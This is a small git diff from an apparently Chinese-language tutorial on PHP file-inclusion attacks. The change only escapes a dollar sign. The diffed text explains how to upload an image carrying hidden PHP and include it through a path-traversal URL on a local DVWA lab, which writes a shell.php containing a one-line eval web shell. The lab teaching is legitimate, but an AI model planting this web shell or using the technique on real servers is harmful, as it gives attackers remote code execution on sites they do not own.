@@ -102,7 +102,7 @@ include_once()和require_once()：若文件中代码已被包含则不会再次�
 * 包含图片马写shell
 
 ```
-上传图片马，马包含的代码为<?fputs(fopen("shell.php","w"),"<?php eval($_POST[xxser]);?>")?>，
+上传图片马，马包含的代码为<?fputs(fopen("shell.php","w"),"<?php eval(\$_POST[xxser]);?>")?>，
 上传后图片路径为/uploadfile/201643.jpg，当访问
 http://localhost/dvwa/vulnerabilities/fi/?page=../../uploadfile/201643.jpg时，
 将会在fi这个文件夹下生成shell.php,内容为<?php eval($_POST[xxser]);?>
